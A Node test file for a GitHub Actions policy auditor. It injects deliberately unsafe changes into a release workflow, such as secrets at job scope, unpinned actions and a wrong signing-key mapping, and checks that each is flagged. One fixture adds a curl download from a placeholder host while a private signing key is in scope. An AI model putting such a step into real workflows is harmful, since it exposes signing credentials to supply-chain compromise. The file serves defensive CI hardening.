import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  WorkflowPolicyError,
  auditPolicyWorkflow,
  auditWorkflowPolicy,
} from "./workflow-policy.mjs";

const releaseWorkflow = await readFile(
  new URL("../.github/workflows/release.yml", import.meta.url),
  "utf8",
);
const policyWorkflow = await readFile(
  new URL("../.github/workflows/policy.yml", import.meta.url),
  "utf8",
);

function diagnosticIdentities(source) {
  return auditWorkflowPolicy(source).map(
    ({ code, job, step }) => `${code}:${job}:${step ?? "job"}`,
  );
}

test("rejects empty, malformed, and non-mapping workflow inputs", () => {
  for (const [source, message] of [
    ["", "workflow source must be non-empty text"],
    ["jobs: [", "workflow source must be valid YAML"],
    ["- job", "workflow root must be a mapping"],
  ]) {
    assert.throws(
      () => auditWorkflowPolicy(source),
      (error) => error instanceof WorkflowPolicyError && error.message === message,
    );
  }
});

test("accepts the release workflow's isolated credential boundaries", () => {
  assert.deepEqual(diagnosticIdentities(releaseWorkflow), []);
});

test("reports secrets at job scope and a missing source environment", () => {
  const hostile = releaseWorkflow
    .replace("    environment: zerglang-source-read\n", "")
    .replace(
      "      CARGO_TERM_COLOR: always",
      "      SOURCE_KEY: \${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}\n" +
        "      CARGO_TERM_COLOR: always",
    );
  assert.deepEqual(diagnosticIdentities(hostile), [
    "environment-boundary:build:job",
    "job-secret-scope:build:job",
  ]);
});

test("reports updater work while its private key is in scope", () => {
  const hostile = releaseWorkflow.replace(
    "          unset TAURI_PRIVATE_KEY TAURI_PRIVATE_KEY_PASSWORD",
    "          curl https://example.invalid/verifier.tar.gz --output verifier.tar.gz\n" +
      "          unset TAURI_PRIVATE_KEY TAURI_PRIVATE_KEY_PASSWORD",
  );
  assert.deepEqual(diagnosticIdentities(hostile), [
    "updater-secret-window:sign_updater_preview:Sign only the preview updater archive",
  ]);
});

test("reports the wrong channel signer mapping", () => {
  const hostile = releaseWorkflow.replace(
    "secrets.ZERGLANG_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
    "secrets.ZERGLANG_STABLE_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
  );
  assert.deepEqual(diagnosticIdentities(hostile), [
    "updater-credential-contract:sign_updater_preview:Sign only the preview updater archive",
  ]);
});

test("reports an unpinned action, mutable publication, and synthetic dispatch", () => {
  const unpinned = releaseWorkflow.replace(
    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "actions/checkout@v7",
  );
  assert.deepEqual(diagnosticIdentities(unpinned), [
    "unpinned-action:validate:uses actions/checkout@v7",
  ]);

  const mutable = releaseWorkflow.replace("--draft=false", "--draft=true");
  assert.deepEqual(diagnosticIdentities(mutable), [
    "job-contract:publish:job",
  ]);

  const synthetic = releaseWorkflow.replace("      request_file:", "      channel:");
  assert.deepEqual(diagnosticIdentities(synthetic), [
    "trigger-contract:workflow:job",
  ]);
});

test("requires pull-request CI to execute every public policy gate", () => {
  assert.deepEqual(
    auditPolicyWorkflow(policyWorkflow).map(
      ({ code, job, step }) => `${code}:${job}:${step ?? "job"}`,
    ),
    ["policy-ci-contract:policy:job"],
  );
});
